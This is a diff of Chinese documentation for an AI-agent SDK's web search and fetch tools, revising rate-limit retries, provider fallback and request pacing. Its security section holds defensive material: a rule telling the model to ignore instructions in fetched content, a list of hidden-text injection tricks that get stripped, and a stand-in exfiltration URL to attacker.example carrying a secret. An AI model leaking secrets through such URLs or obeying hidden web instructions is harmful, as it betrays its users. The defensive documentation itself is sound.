@@ -69,7 +69,7 @@ arXiv 的结果还带有 `authors`、`pdfUrl`、`updated` 和 `category`；仓�
 
 ## 搜索提供商 {#search-providers}
 
-`web_search` **按顺序**询问它的提供商：一个失败了、被限流了或者用验证码页面作答的提供商，会把请求交给下一个。应答会说明是哪个提供商作答的（`provider`），以及排在它前面的提供商为什么没有作答（`errors`）。
+`web_search` **按顺序**询问它的提供商：一个失败了，或者在第二次尝试之后仍然被限流的提供商，会把请求交给下一个。应答会说明是哪个提供商作答的（`provider`），以及排在它前面的提供商为什么没有作答（`errors`）。
 
 ```ts
 import { brave, duckDuckGo, searxng, webTools } from '@sdk-ai-agents/core';
@@ -85,7 +85,7 @@ const tools = webTools({
 
 | 提供商 | 需要的配置 | 日期 | 说明 |
 | --- | --- | --- | --- |
-| `duckDuckGo({ region?, minIntervalMs?, baseUrl? })` | 无（默认的提供商） | 部分结果有 | 读取的是 DuckDuckGo 的 HTML 页面，不是官方 API。提供标题、链接和摘要；广告会被跳过。验证码页面，或者连续两次得到空白页面，会让它把请求交给下一个提供商。两次搜索之间间隔 1.5 秒。 |
+| `duckDuckGo({ region?, minIntervalMs?, baseUrl? })` | 无（默认的提供商） | 部分结果有 | 读取的是 DuckDuckGo 的 HTML 页面，不是官方 API。提供标题、链接和摘要；广告会被跳过。验证码页面或空白页面都算作限流。两次搜索之间间隔 4 秒，从上一次搜索结束时算起。 |
 | `searxng({ baseUrl, engines?, categories?, minIntervalMs? })` | 你自己的 [SearXNG](https://docs.searxng.org/) 实例，它的 `settings.yml` 中要有 `formats: [html, json]` | `publishedDate` | 每个结果都会写明找到它的引擎（`searxng:bing`）。因为引擎失败而没有任何结果的应答，会把请求交给下一个提供商。 |
 | `brave({ apiKey, baseUrl?, minIntervalMs? })` | 一个 Brave Search API 密钥 | `page_age` | 两次搜索之间间隔 1 秒，也就是免费套餐的速率。 |
 | `tavily({ apiKey, baseUrl?, minIntervalMs? })` | 一个 Tavily API 密钥 | `published_date` | `site` 作为 `include_domains` 发送；不支持指定语言。 |
@@ -93,7 +93,9 @@ const tools = webTools({
 
 每个提供商都会把 `site`、`freshness` 和 `language` 转换成它自己的参数（查询中的 `site:`、`df`、`time_range`、`freshness=pw`、`tbs=qdr:w`、`kl`、`search_lang`……）。来自 `site` 以外网站的结果会被丢弃，无论是哪个提供商找到的。
 
-**熔断器。** 被限流的提供商（HTTP 429、验证码页面）会立即被搁置，其他提供商则在连续失败三次之后被搁置：在两分钟内，它会被直接跳过，不发出任何请求（`errors` 会说明搁置到什么时候）。之后它会再得到一次尝试的机会。`circuitBreaker: { cooldownMs, failureThreshold }` 可以修改这两个值。
+**限流。** 对搜索限流的提供商（HTTP 429、DuckDuckGo 的验证码页面或空白页面）会再得到一次尝试的机会：在它要求的等待时间（`Retry-After`）或 `throttleWaitMs`（10 秒）之后，前提是调用的时限还留有足够的时间。要求等待超过 30 秒的提供商，绝不会早于它要求的时间被再次尝试：在这段时间内（至少 `circuitBreaker.cooldownMs`）它会被跳过；当没有其他提供商作答时，调用会立即以 `throttled` 失败，并给出它要求的等待时间（`retryAfterMs`）。
+
+**熔断器。** 在第二次尝试之后仍然被限流的提供商会立即被搁置，其他提供商则在连续失败三次之后被搁置：在两分钟内，它会被直接跳过，不发出任何请求（`errors` 会说明搁置到什么时候）。之后它会再得到一次尝试的机会。`circuitBreaker: { cooldownMs, failureThreshold }` 可以修改这两个值。当没有任何提供商作答时，错误（`SearchUnavailableError`）会说明它们是否全都被限流了（`throttled`），以及被跳过的提供商什么时候会再被尝试（`retryAfterMs`）：研究会在稍后把这样的搜索再尝试一次。
 
 ### 你自己的提供商 {#your-own-provider}
 
@@ -130,15 +132,16 @@ const intranetSearch: SearchProvider = {
 | `callTimeoutMs` | `60000` | 整个调用的时限，无论调用在等待什么：robots.txt、节奏控制、每一次重定向、应答体，以及网页或 PDF 的提取。超过时限后，这一切都会被中止，调用以 `WebTimeoutError` 失败。它限制的是每一次尝试：使用 `retry` 时，一次调用最长可能耗时这个值的 `maxRetries + 1` 倍，再加上各次尝试之间的等待时间。 |
 | `maxResponseBytes` | `2000000` | 读取的应答体的最大字节数，按解压后计算。 |
 | `maxRedirects` | `5` | 最多跟随的重定向次数，每一次都会重新检查。 |
-| `hostIntervalMs` | `1000` | 对同一个主机的两次 `web_fetch` 请求之间的最短间隔。 |
+| `hostIntervalMs` | `1000` | 从对某个主机的一次 `web_fetch` 请求结束，到下一次请求开始之间的最短间隔。 |
+| `throttleWaitMs` | `10000` | 被限流的提供商或来源没有说明等待时间（`Retry-After`）时，在第二次尝试之前等待的时长。 |
 | `robots` | `true` | `web_fetch` 遵守 robots.txt；设为 `false` 则关闭。 |
 | `allowPrivateNetwork` | `false` | `true`，或者一个主机列表（`intranet.example`、`127.0.0.1:8080`），列出的主机可以位于本机或私有网络上。 |
 | `lookup` | 系统的解析器 | 解析主机名：`(hostname) => Promise<Array<{ address, family }>>`。 |
 | `maxPdfBytes` | `10000000` | 读取的 PDF 的最大字节数。更大的 PDF 会被拒绝。 |
 | `maxPdfPages` | `30` | 读取的 PDF 页数。 |
 | `cache` | `{ ttlMs: 600000, maxEntries: 200, maxBytes: 20000000 }` | 按工具和参数在内存中保留的结果，按 JSON 计算最多 `maxBytes`；设为 `false` 则关闭。 |
-| `retry` | — | 对失败调用的重试（`{ maxRetries }`）：针对限流、服务器错误、超时和网络故障；从不针对拒绝、缺少的配置（`WebConfigurationError`）或没有任何提供商作答的搜索（`SearchUnavailableError`）重试。 |
-| `arxiv` | `{ baseUrl: 'https://export.arxiv.org', minIntervalMs: 3000 }` | arXiv API 要求两次请求之间间隔 3 秒。 |
+| `retry` | — | 对失败调用的重试（`{ maxRetries }`）：针对服务器错误、超时和网络故障；从不针对拒绝、缺少的配置（`WebConfigurationError`）、没有任何提供商作答的搜索（`SearchUnavailableError`）或限流（HTTP 429、`SearchThrottledError`，工具已经给过它第二次尝试）重试。 |
+| `arxiv` | `{ baseUrl: 'https://export.arxiv.org', minIntervalMs: 3000 }` | arXiv API 要求两次请求之间间隔 3 秒，并且一次只发一个请求：间隔从上一次请求结束时算起。被拒绝的请求（HTTP 406、429、503）会在等待之后再得到一次尝试的机会。 |
 | `wikipedia` | `{ baseUrl: 'https://{language}.wikipedia.org', language: 'en' }` | `{language}` 会被替换为搜索所用的语言。你自己提供的 `baseUrl` 只有在其主机中不含 `{language}` 时，才免于私有网络检查。 |
 | `github` | `{ baseUrl: 'https://api.github.com' }` | `token` 可以提高速率限制（没有它时每分钟 10 次搜索），搜索代码也需要它。 |
 
@@ -148,7 +151,7 @@ const intranetSearch: SearchProvider = {
 2. **例外通道必须明确打开。** `allowPrivateNetwork: ['intranet.example']` 只放行列出的主机，`true` 则放行所有主机。你提供给提供商或来源的 `baseUrl` 来自你的代码，而不是来自模型：即使它在本机上（比如 `localhost` 上的 SearXNG）也可以访问，但只限于它自己的源，也只限于这个提供商或来源的请求——重定向到别处时会被检查，而 `web_fetch` 仍然会拒绝它。这项豁免在调用 `webTools()` 时就已确定（提供商通过 `configuredOrigin` 声明它），绝不由请求决定。默认的公共端点（DuckDuckGo、arXiv、Wikipedia、GitHub）永远不会被豁免：它们的 DNS 不在你的控制之下。
 3. **只允许 http 和 https**，https 永远不会被重定向降级为 http，最多跟随 `maxRedirects` 次重定向，TLS 证书始终会被验证。API 密钥或令牌永远不会被发往重定向所指向的另一个源。
 4. **有上限。** 整个调用有时限（`callTimeoutMs`），每个请求都有超时；最多读取 `maxResponseBytes`（按解压后计算），其余部分根本不会下载；PDF 受 `maxPdfBytes`（声明自己更大的 PDF 在下载之前就会被拒绝）和 `maxPdfPages` 限制，并一次一个地在工作线程中读取，这个线程会在 pdf.js 读取之前解析 PDF，在流解压后超过 256 MB 或无法读取这些流时拒绝它，并在进程增长超过 1 GB 或超过 20 秒时被停止（这是加密 PDF 仅有的上限，因为它无法测量）；网页的提取限制在 100,000 个元素和 5 秒的处理之内；内容受 `maxChars` 限制。下载之后的任何处理都无法阻塞进程：robots.txt 的匹配在线性时间内完成，HTML 的处理流程中没有平方复杂度的步骤。
-5. **守礼。** `web_fetch` 会读取 robots.txt（[RFC 9309](https://www.rfc-editor.org/rfc/rfc9309)），绝不获取它对 `sdk-ai-agents` 禁止访问的内容，重定向也包括在内：先看点名 `sdk-ai-agents` 的那一组规则，否则看 `*` 那一组；最长的规则胜出，打平时 `Allow` 胜出；支持 `*` 和 `$` 模式；非保留字符的转义在比较之前会被解码（`%7E` 就是 `~`）。缺失的 robots.txt（4xx）允许一切；获取失败（5xx、429）或无法访问的 robots.txt 禁止一切。读取 robots.txt 不会推迟第一个网页；`Crawl-delay` 会拉开此后请求的间隔，超过 30 秒的延迟会让下一个网页在这段时间结束前被拒绝。对每个主机的请求都有节奏控制（网页 1 秒，DuckDuckGo 1.5 秒，arXiv 3 秒），应答会被缓存，用户代理会说明是谁在请求。搜索 API 不属于爬取对象：robots.txt 不适用于它们。
+5. **守礼。** `web_fetch` 会读取 robots.txt（[RFC 9309](https://www.rfc-editor.org/rfc/rfc9309)），绝不获取它对 `sdk-ai-agents` 禁止访问的内容，重定向也包括在内：先看点名 `sdk-ai-agents` 的那一组规则，否则看 `*` 那一组；最长的规则胜出，打平时 `Allow` 胜出；支持 `*` 和 `$` 模式；非保留字符的转义在比较之前会被解码（`%7E` 就是 `~`）。缺失的 robots.txt（4xx）允许一切；获取失败（5xx、429）或无法访问的 robots.txt 禁止一切。读取 robots.txt 不会推迟第一个网页；`Crawl-delay` 会拉开此后请求的间隔，超过 30 秒的延迟会让下一个网页在这段时间结束前被拒绝。对每个主机的请求一次只发一个，每个请求都在一段从上一个请求结束时算起的间隔之后发出（网页 1 秒，DuckDuckGo 4 秒，arXiv 3 秒），进程中的每个 `webTools()` 都共享这一节奏控制；被限流时会在等待之后再尝试一次，而不是接连尝试多次；应答会被缓存，用户代理会说明是谁在请求。搜索 API 不属于爬取对象：robots.txt 不适用于它们。
 6. **内容就是数据。** 每个应答都写着 `untrusted: true`，工具描述也会告诉模型绝不要遵循其中出现的指令。在提取之前，`web_fetch` 会丢弃读者看不见、模型却会读到的东西：`hidden`、`aria-hidden="true"`、`display:none`、`visibility:hidden`、字号为零或不透明度为零的元素，HTML 注释，以及不可见字符：零宽字符和双向控制字符、Tags 区块（它可以用不可见的方式拼写文字）和变体选择符。搜索结果和错误消息也会以同样的方式清理；错误最多引用服务器应答中的一行，并标记为不可信。研究会把结果放在不可信数据的标记之间展示给它的模型。
 7. **受治理。** `web_fetch` 的风险是中等，而不是低：URL 由模型选择，而一个 URL 就能把数据带出去（`https://attacker.example/?q=<secret>`）。不要把它交给持有机密的智能体，或者让人审批每一次调用：
 
@@ -189,4 +192,4 @@ const study = sdk.createStudy({ name: 'browser', object, objective, sources });
 - **主要内容的规则很简单。** `<main>`、最长的 `<article>`，否则是 `<body>`：主要内容内部的样板文字会保留下来。
 - **没有 OCR。** 扫描版 PDF 没有可读取的文本。
 - **DuckDuckGo 的 HTML 页面不是 API。** 它的格式可能会变，而且它会限制大量使用：需要大量搜索时，请配置另一个提供商。
-- **缓存和节奏控制都保存在内存中**，每次调用 `webTools()` 各有一份，进程结束时就会丢失。
+- **缓存和节奏控制都保存在内存中**，进程结束时就会丢失：缓存在每次调用 `webTools()` 时各有一份，节奏控制则属于整个进程。同一台机器上的另一个进程会单独控制节奏。
